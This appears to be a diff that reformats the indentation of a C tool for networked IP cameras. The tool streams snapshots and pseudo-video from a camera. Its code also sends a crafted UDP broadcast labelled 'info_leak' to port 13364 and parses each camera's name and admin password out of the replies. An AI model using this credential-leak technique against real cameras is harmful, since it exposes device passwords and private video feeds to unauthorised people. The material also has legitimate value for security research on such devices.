@@ -41,8 +41,8 @@
   responses.
 */
 struct iplinkedlist{
-  struct iplinkedlist* next;
-  char ip[16];
+	struct iplinkedlist* next;
+	char ip[16];
 };
 
 /*
@@ -50,10 +50,10 @@ struct iplinkedlist{
   it prints the message and does some cleanup
 */
 void error(char * str, ...){
-  va_list args;
-  va_start(args, str);
-  vprintf(str, args);
-  va_end(args);
+	va_list args;
+	va_start(args, str);
+	vprintf(str, args);
+	va_end(args);
 	fflush(stdout);
 	close_display();/*mimii*/
 	exit(1);
@@ -80,9 +80,9 @@ void show_help(char *argv[]) {
 	printf("-a\tLooks for the admin-pw of all devices\n");
 	printf("-h\tYou are currently looking at it\n\n");
 	printf("IP:\n");
-  printf("\tIf you don't specify an ip\n");
-  printf("\twe'll default to \"192.168.178.25\"\n\n");
-  printf("Without options the binary will output\n");
+	printf("\tIf you don't specify an ip\n");
+	printf("\twe'll default to \"192.168.178.25\"\n\n");
+	printf("Without options the binary will output\n");
 	printf("a pseudo-video by requesting pic by pic.\n");
 }
 
@@ -97,17 +97,17 @@ void show_help(char *argv[]) {
 void udp_get(void) {
 	int sockfd, n, i = 0, cameras = 0;
 	struct sockaddr_in dest, fromcam; /*connector's address information*/
-  struct timeval tval;/*receive timeout*/
+	struct timeval tval;/*receive timeout*/
 	size_t addr_len;
 	int broadcast = 1;
 	char text[623], passwd[512], name[512], *ip;
 	FILE *file;
-  struct iplinkedlist root;/*list of ip's that already responded*/
+	struct iplinkedlist root;/*list of ip's that already responded*/
 
-  root.next = NULL;
+	root.next = NULL;
 
-  tval.tv_sec = 2;
-  tval.tv_usec = 0;
+	tval.tv_sec = 2;
+	tval.tv_usec = 0;
 
 	char info_leak[] = { 0x00, 0x1f, 0x1f, 0x61, 0xb7, 0xfa, 0x00, 0x02, 0xff, 0xfd };
 
@@ -121,8 +121,8 @@ void udp_get(void) {
 	if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &broadcast, sizeof broadcast) == -1)
 		error("setsockopt (SO_REUSEADDR)\n");
   
-  if(setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &tval, sizeof tval) == -1)
-    error("setsockopt (SO_RCVTIMEO)\n");
+	if(setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &tval, sizeof tval) == -1)
+		error("setsockopt (SO_RCVTIMEO)\n");
 
 	dest.sin_family = AF_INET;     // host byte order
 	dest.sin_port = htons(13364); // short, network byte order
@@ -132,102 +132,104 @@ void udp_get(void) {
 	if (bind(sockfd, (struct sockaddr *) &dest, sizeof(dest)) == -1) /* we want source and dest-port to be 13364 */
 		error("Bind\n");
 
-  printf("scanning...\n");
+	printf("scanning...\n");
 	if ((n=sendto(sockfd, info_leak, sizeof(info_leak), 0, (struct sockaddr *)&dest, sizeof dest)) == -1)
 		error("sendto\n");
 
 	/* printf("sent %d bytes to %s\n", n, inet_ntoa(dest.sin_addr)); */
-  while(1)
-  {
-    addr_len = sizeof fromcam;	
+	while(1){
+		addr_len = sizeof fromcam;	
 		memset(text, 0, sizeof(text));
 		
-    n = recvfrom(sockfd, text, sizeof(text), 0, (struct sockaddr *)&fromcam, &addr_len);
-    if(n<1)/*most likely: connection timeout*/
-      break;
-    ip = inet_ntoa(fromcam.sin_addr);
+		n = recvfrom(sockfd, text, sizeof(text), 0, (struct sockaddr *)&fromcam, &addr_len);
+		if(n<1)/*most likely: connection timeout*/
+			break;
 
-    /*check if we already got a response from the peer*/
-    struct iplinkedlist* ptr = &root;
-    int proceed = 1;
-    while(ptr->next)
-    {
-      ptr = ptr->next;
-      if(!strcmp(ptr->ip, ip))
-      {  
-        proceed = 0;/*already got response, try next response*/
-        break;
-      }
-    }
-    if(!proceed)
-      continue;
+		ip = inet_ntoa(fromcam.sin_addr);
 
-    /*if not add it to the list*/
-    ptr->next = malloc(sizeof(struct iplinkedlist));
-    ptr->next->next = NULL;
-    strncpy(ptr->next->ip, ip ,15);
-    ip[15]='\0';
+		/*check if we already got a response from the peer*/
+		struct iplinkedlist* ptr = &root;
+		int proceed = 1;
 
-    if(memcmp(text, info_leak, sizeof info_leak)) 
-    /*matches all responses except ours
-      since our request gets received by ourselves too 
-      (we listen on the same port that we broadcast to*/
-    {
-      /*check if we already got a response from the peer*/
-      struct iplinkedlist* rootptr = &root;
-      int proceed = 1;
-      while(rootptr->next)
-      {
-        ptr = rootptr->next;
-        if(!strcmp(rootptr->ip, ip))
-        {  
-          proceed = 0;/*already got response, try next response*/
-          break;
-        }
-      }
-      if(!proceed)
-        continue;
+		while(ptr->next){
+			ptr = ptr->next;
+			if(!strcmp(ptr->ip, ip)){  
+				proceed = 0;/*already got response, try next response*/
+				break;
+			}
+		}
+    
+		if(!proceed)
+			continue;
 
-      /*if not add it to the list*/
-      ptr->next = malloc(sizeof(struct iplinkedlist));
-      ptr->next->next = NULL;
-      strncpy(rootptr->next->ip, ip ,15);
-      ip[15]='\0';
+		/*if not add it to the list*/
+		ptr->next = malloc(sizeof(struct iplinkedlist));
+		ptr->next->next = NULL;
+		strncpy(ptr->next->ip, ip ,15);
+		ip[15]='\0';
 
-      /*now, parse the received data*/
-      if(n<=333)/*not enough data ;)*/
-        continue;
+		if(memcmp(text, info_leak, sizeof info_leak)) 
+		/*matches all responses except ours
+		since our request gets received by ourselves too 
+		(we listen on the same port that we broadcast to*/
+		{
+			/*check if we already got a response from the peer*/
+			struct iplinkedlist* rootptr = &root;
+			int proceed = 1;
+			while(rootptr->next){
+				ptr = rootptr->next;
+			
+				if(!strcmp(rootptr->ip, ip)){  
+	       	  			proceed = 0;/*already got response, try next response*/
+					break;
+				}
+			}
+		
+			if(!proceed)
+				continue;
+	
+			/*if not add it to the list*/
+			ptr->next = malloc(sizeof(struct iplinkedlist));
+			ptr->next->next = NULL;
+			strncpy(rootptr->next->ip, ip ,15);
+			ip[15]='\0';
 
-      char *ptr = text+170;
-      int offset =0;
+			/*now, parse the received data*/
+			if(n<=333)/*not enough data ;)*/
+				continue;
 
-      //filter cam name
-      while(*ptr && (ptr-text<n) && (ptr-text-170<sizeof name))/*only write to memory allowed to write to*/
-      {
-        name[offset] = *ptr;
-        offset++;
-        ptr++;
-      }
-      name[offset]='\0';
+			char *ptr = text+170;
+			int offset =0;
+
+			//filter cam name
+			while(*ptr && (ptr-text<n) && (ptr-text-170<sizeof name))/*only write to memory allowed to write to*/
+			{
+				name[offset] = *ptr;
+				offset++;
+				ptr++;
+			}
+		
+			name[offset]='\0';
       
-      //filter password
-      ptr = text+333;
-      offset = 0;
+			//filter password
+			ptr = text+333;
+			offset = 0;
       
-      while(*ptr && (ptr-text<n) && (ptr-text-333<sizeof passwd))/*only write to memory allowed to write to*/
-      {
-        passwd[offset] = *ptr;
-        offset++;
-        ptr++;
-      }
-      passwd[offset] = '\0';
+			while(*ptr && (ptr-text<n) && (ptr-text-333<sizeof passwd))/*only write to memory allowed to write to*/
+			{
+				passwd[offset] = *ptr;
+				offset++;
+				ptr++;
+			}
+		
+			passwd[offset] = '\0';
 
-      /*print password, cam name and so on*/
-      printf("password for cam `%s'(%s) is '%s'\n", name, ip, passwd);
-      cameras++;
-    }
+			/*print password, cam name and so on*/
+			printf("password for cam `%s'(%s) is '%s'\n", name, ip, passwd);
+			cameras++;
+		}
 	}
-  printf("done, found %i cameras.\n", cameras);
+	printf("done, found %i cameras.\n", cameras);
 	close(sockfd);
 /* 
         * get len of camname...*
@@ -261,7 +263,7 @@ int pic_req(int sockfd, char *picbuffer, int len) {
 	char recbuffer[PICP_SIZE];
  
 	int loop = 1,
-      offset = 0,
+	offset = 0,
 	    n = 0,
 	    i = 0;
 
@@ -309,7 +311,7 @@ int pic_req(int sockfd, char *picbuffer, int len) {
 			return -1;
 		}
 	}
-  return offset;
+	return offset;
 }
 
 /* Login-Packet for first tests. Hardcoded username 1 with password muh 
@@ -346,8 +348,8 @@ int login_cam(int sockfd) {
 int main(int argc, char *argv[]) {
 	int len, sockfd, login, c, snap = 0, port = PORT;
 	struct sockaddr_in dest;
-  char ip[16]="";
-  char picbuffer[PICP_SIZE];
+	char ip[16]="";
+	char picbuffer[PICP_SIZE];
 	FILE *file;
 	int res;
   
@@ -370,24 +372,22 @@ int main(int argc, char *argv[]) {
 		    break;
 	  }
 
-  if(optind >= argc)
-  {
-    printf("No ip specified, defaulting to: %s\n", IP);
-    strncpy(ip, IP, 15);
-  }
-  else
-  {
-    strncpy(ip, argv[optind], 15);
-  }
-  ip[15]='\0';
+	if(optind >= argc){
+		printf("No ip specified, defaulting to: %s\n", IP);
+		strncpy(ip, IP, 15);
+	} else {
+		strncpy(ip, argv[optind], 15);
+	}
+	
+	ip[15]='\0';
   
-  /*fixes some issues*/
+	/*fixes some issues*/
 	signal(SIGINT, sigintfix);
 
 	sockfd = socket(AF_INET, SOCK_STREAM, 0);
 	
 	if(sockfd == -1)
-	  error("Error while creating socket..\n");
+		error("Error while creating socket..\n");
 	
 	memset(&dest, 0, sizeof(dest));
 	dest.sin_family = AF_INET;
@@ -406,43 +406,48 @@ int main(int argc, char *argv[]) {
 		printf("Login success!\n");
 	}*/
   
-  if (snap) {
-    file = fopen("snapshot.jpg","w");
-    len = pic_req(sockfd, picbuffer, sizeof picbuffer);
-    if(len == -1 || len <30)
-      error("Failed to get picture from cam\n");
+	if (snap) {
+		file = fopen("snapshot.jpg","w");
+		len = pic_req(sockfd, picbuffer, sizeof picbuffer);
+		
+		if(len == -1 || len <30)
+			error("Failed to get picture from cam\n");
 
-    fwrite(picbuffer+28,sizeof(picbuffer[0]),len-28,file);
-	  fclose(file);
-    exit(0);
-  } else {
-    /* main-loop for pseudo-video*/
-	  unsigned short width, height;
-    int inited = 0;
+		fwrite(picbuffer+28,sizeof(picbuffer[0]),len-28,file);
+		fclose(file);
+		exit(0);
+	} else {
+		/* main-loop for pseudo-video*/
+		unsigned short width, height;
+		int inited = 0;
     
-    while(1) {
-		  len = pic_req(sockfd, picbuffer, sizeof picbuffer);
-      if(len < 30)
-      {
-        printf("Getting picture from cam failed.. retrying\n");
-        continue;
-      }
-      if(!inited)
-      {
-        width = ntohs(*(short*)(picbuffer+8));
-        height = ntohs(*(short*)(picbuffer+10));
+		while(1) {
+			len = pic_req(sockfd, picbuffer, sizeof picbuffer);
+		
+			if(len < 30){
+				printf("Getting picture from cam failed.. retrying\n");
+				continue;
+			}
+			if(!inited){
+        
+			width = ntohs(*(short*)(picbuffer+8));
+			height = ntohs(*(short*)(picbuffer+10));
 
-        res = init_display(320,240); 
-	      if(res == -1)
-          error("init_display failed!\n");
-        printf("image dimensions: %ix%i\n", width, height);
-        inited=1;
-      }
-      show_jpegmem(picbuffer+28, len-28);
+			res = init_display(320,240); 
+		
+			if(res == -1)
+				error("init_display failed!\n");
+		
+			printf("image dimensions: %ix%i\n", width, height);
+			inited=1;
+			}
+		
+			show_jpegmem(picbuffer+28, len-28);
 			
-		  if(update_display() == -1) /* SIGINT will be handled by update_display*/
-			  exit(0);
-	  }
+			if(update_display() == -1) /* SIGINT will be handled by update_display*/
+				exit(0);
+		}
 	}
+	
 	return 0;
 }
